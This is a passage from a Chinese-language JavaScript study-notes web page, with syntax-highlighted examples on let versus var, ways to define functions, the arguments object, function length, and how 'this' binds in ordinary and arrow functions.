    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">'says hello to'</span><span class="token punctuation">,</span> guest<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> i<span class="token punctuation">;</span>
<span class="token keyword">var</span> guest<span class="token punctuation">;</span>
<span class="token keyword">var</span> guests <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'John'</span><span class="token punctuation">,</span> <span class="token string">'Tom'</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> guests<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    guest <span class="token operator">=</span> guests<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// do something on guest</span>
    <span class="token function">sayHello</span><span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//ES6优化后：如果对于新的项目，可以使用let替换var，会变得更可靠，可维护性更高：</span>
<span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">'samy'</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> <span class="token function-variable function">sayHello</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">guest</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">'says hello to'</span><span class="token punctuation">,</span> guest<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> guests <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'John'</span><span class="token punctuation">,</span> <span class="token string">'Tom'</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> guests<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> guest <span class="token operator">=</span> guests<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// do something on guest</span>
    <span class="token function">sayHello</span><span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// samy says hello to John</span>
<span class="token comment">// samy says hello to Tom</span>
<span class="token comment">// samy says hello to Jack</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><h4 id="_3-函数属性-方法-参数"><a href="#_3-函数属性-方法-参数" class="header-anchor">#</a> 3:函数属性/方法/参数</h4> <p><strong>定义函数的方式有 3 种：</strong></p> <ul><li>1:function命令(通过function关键字);  <code>function fn() {}</code></li> <li>2:函数表达式(匿名函数); ===&gt; 简写 箭头函数； <code>var fn = function() {}</code> <code>var fn = () =&gt; {}</code></li> <li>3:Function构造函数;  <code>new Function(str)</code>  声明的对象是在<strong>函数创建时解析</strong>的，故比较低效</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">//ES5</span>
<span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">//匿名函数</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">//ES6, 如果{}内容只有一行{}和return关键字可省</span>

<span class="token keyword">var</span> <span class="token function-variable function">sum</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">//ES5</span>
<span class="token keyword">let</span> <span class="token function-variable function">sum</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">//ES6, 如果{}内容只有一行{}和return关键字可省</span>
<span class="token comment">//将匿名函数分配给变量并将其作为参数传递给另一个函数; </span>
<span class="token comment">//一个匿名函数可以分配给一个变量，它也可以作为参数传递给另一个函数</span>

<span class="token keyword">const</span> sum <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token punctuation">,</span> <span class="token string">'return a + b'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><strong>比较</strong>：</p> <p>1.函数声明有预解析,而且<strong>函数声明的优先级高于变量</strong>;</p> <p>2.使用Function构造函数定义函数的方式是一个函数表达式, <strong>这种方式会导致解析两次代码，影响性能</strong>。第一次<strong>解析常规的JavaScript代码</strong>，第二次解析<strong>传入构造函数的字符串</strong>;</p> <h5 id="参数相关"><a href="#参数相关" class="header-anchor">#</a> 参数相关</h5> <p><strong>传递引用</strong></p> <p><strong>JavaScript 中只有「传递引用」而没有「引用传递」</strong></p> <p>[<code>引用传递</code>]实际上是 C++ 中存在的概念：<code>&amp;a = b</code> 相当于给变量 <code>b</code> 起了一个别名 <code>a</code>，<strong>「引用」与「指针」最大的区别在于</strong>一旦引用被初始化，就不能改变引用的关系。</p> <p><strong>传递参数</strong></p> <p>1.所有的参数都是<strong>按值传递</strong>的。在向参数传递引用类型的值时【传递引用】，把<strong>这个值在内存中的地址复制给一个局部变量</strong>，因此这个局部变量的变化会反应在函数外部;</p> <p>2.当在函数内部重写obj时，这个变量引用的就是一个局部对象。而<strong>这个局部对象会在函数执行完毕后立即被销毁;</strong></p> <h5 id="arguments对象及类数组"><a href="#arguments对象及类数组" class="header-anchor">#</a> arguments对象及类数组</h5> <p>将伪数组对象或可遍历对象转换为真数组:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 方式一：Array.from(xxx)</span>
<span class="token keyword">let</span> btns <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">&quot;button&quot;</span><span class="token punctuation">)</span>
Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>btns<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token operator">=&gt;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//将伪数组转换为数组</span>
<span class="token comment">// 方式二：[...xxx]</span>
<span class="token keyword">function</span> <span class="token function">doSomething</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span> 
<span class="token punctuation">}</span>
<span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]</span>
<span class="token comment">//代替apply：`Math.max.apply(null, [x, y])` =&gt; `Math.max(...[x, y])`</span>

<span class="token comment">// 方式三：</span>
<span class="token keyword">var</span> _args <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> _args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> _args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// [...]</span>
<span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span> <span class="token comment">//arguments是类数组(伪数组)</span>
<span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span>
Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h5 id="caller-callee和arguments区别"><a href="#caller-callee和arguments区别" class="header-anchor">#</a> caller, callee和arguments区别</h5> <p>caller(父),callee(子)之间的关系就像是employer和employee之间的关系，就是调用与被调用的关系，二者返回的都是函数对象引用</p> <p><img src="/rat-summ/assets/img/16-54-47.f3fca2cd.jpg" alt=""></p> <h5 id="函数的length"><a href="#函数的length" class="header-anchor">#</a> 函数的length</h5> <blockquote><p><strong>函数的length属性</strong>与实际传入的参数个数无关，<strong>只反映函数预期传入的参数个数</strong>。</p></blockquote> <p>示范：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">fn1</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">fn2</span> <span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">fn3</span> <span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn1<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 0</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn2<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn3<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 2</span>

<span class="token comment">//**默认参数：**</span>
<span class="token keyword">function</span> <span class="token function">fn1</span> <span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">fn2</span> <span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">'samy'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">fn3</span> <span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age <span class="token operator">=</span> <span class="token number">22</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">fn4</span> <span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age <span class="token operator">=</span> <span class="token number">22</span><span class="token punctuation">,</span> gender</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">fn5</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">'samy'</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> gender<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn1<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn2<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 0</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn3<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn4<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn5<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 0</span>

<span class="token comment">//**剩余参数**</span>
<span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn1<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><h4 id="_4-普通函数与箭头函数的区别"><a href="#_4-普通函数与箭头函数的区别" class="header-anchor">#</a> 4:普通函数与箭头函数的区别</h4> <p><strong>箭头函数</strong>中的this是固定的，它指向定义该函数时所在的对象。<strong>始终指向其父级作用域中的this</strong>；
<strong>普通函数</strong>中的this指向函数被调用的对象，因此<strong>对于不同的调用者，this的值是不同的</strong>；</p> <h5 id="this指向的四种情况"><a href="#this指向的四种情况" class="header-anchor">#</a> this指向的四种情况</h5> <ol><li>有对象就指向调用对象；</li> <li>没有调用对象就指向全局对象；</li> <li>用new构造就指向新对象；</li> <li>通过applay/call/ bind来改变this的指向；</li></ol> <p>图示：
<img src="/rat-summ/assets/img/16-37-35.8d1071a5.jpg" alt=""></p> <h5 id="js作用链域"><a href="#js作用链域" class="header-anchor">#</a> Js作用链域</h5> <p>作用域链的作用是<strong>保证执行环境里有权访问的变量和函数是有序的</strong>，作用域链的<strong>变量只能向上访问，变量访问到window对象即被终止</strong>，作用域链向下访问变量是不被允许的。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code> <span class="token keyword">function</span> <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token comment">//这个属于函数名调用，this指向window</span>
 <span class="token punctuation">}</span>
 <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token comment">//匿名函数调用，this指向window</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 <span class="token keyword">var</span> <span class="token function-variable function">getSum</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token comment">//实际上也是函数名调用，window</span>
 <span class="token punctuation">}</span>
 <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">var</span> objList <span class="token operator">=</span> <span class="token punctuation">{</span>
   name<span class="token operator">:</span> <span class="token string">'methods'</span><span class="token punctuation">,</span>
   <span class="token function-variable function">getSum</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token comment">//objList对象</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
objList<span class="token punctuation">.</span><span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//是构造函数调用，指向实例化的对象personOne</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> personOne <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token string">'我是apply改变的this值'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//我是apply改变的this值</span>
<span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'我是call改变的this值'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//我是call改变的this值</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br></div></div><h5 id="普通函数"><a href="#普通函数" class="header-anchor">#</a> 普通函数</h5> <ol><li><p><strong>以函数的形式</strong>调用（this<strong>指向window/global</strong>）</p> <p>在严格模式下，没找到直接调用者，则函数中的this是undefined。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">fn</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token string">'fn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">subFn</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token string">'subFn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">subFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// window</span>
<span class="token punctuation">}</span>
<span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// window</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> global<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>
<span class="token punctuation">}</span>
<span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token function-variable function">func2</span> <span class="token operator">=</span>  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> global<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>
<span class="token punctuation">}</span>
<span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">function</span> <span class="token function">func3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token string">&quot;use strict&quot;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> global<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//false</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//undefined</span>
<span class="token punctuation">}</span>
<span class="token function">func3</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">function</span> <span class="token function">func4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;---func4---&quot;</span><span class="token punctuation">,</span> <span class="token keyword">this</span> <span class="token operator">===</span> global<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>
  <span class="token keyword">function</span> <span class="token function">subFunc4</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> global<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>
  <span class="token punctuation">}</span>
  <span class="token function">subFunc4</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token function">func4</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div></li> <li><p><strong>以方法的形式</strong>调用 （this<strong>指向调用函数的对象</strong>）</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> a  <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
    a <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token function-variable function">foo</span> <span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//1</span>
<span class="token keyword">var</span> bar <span class="token operator">=</span> obj<span class="token punctuation">;</span>
bar<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
bar<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//2</span>
<span class="token keyword">var</span> baz <span class="token operator">=</span> obj<span class="token punctuation">.</span>foo<span class="token punctuation">;</span>
<span class="token function">baz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//undefined</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div></li></ol> <p>上述代码中，出现了三种情况：</p> <ol><li>直接通过obj调用其中的方法foo，此时，<strong>this就会指向调用foo函数的对象，也就是obj</strong>;</li> <li>将obj对象赋给一个新的对象bar，此时通过bar调用foo函数，<strong>this的值就会指向调用者bar</strong>；</li> <li>将obj.foo赋给一个新对象baz，通过baz()调用foo函数，此时的<strong>this指向window</strong>；</li></ol> <h5 id="箭头函数【要点】"><a href="#箭头函数【要点】" class="header-anchor">#</a> 箭头函数【要点】</h5> <p><strong>箭头函数中的this始终指向定义时其父级作用域中的this</strong>。换句话说，箭头函数会捕获其所在的上下文的this值，作为自己的this值。<strong>任何方法都改变不了其指向，如call(), bind(), apply()。<strong>在箭头函数中调用 this 时，仅仅是简单的</strong>沿着作用域链向上寻找</strong>，找到最近的一个 this 拿来使用，<strong>它与调用时的上下文无关</strong>。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
    a<span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
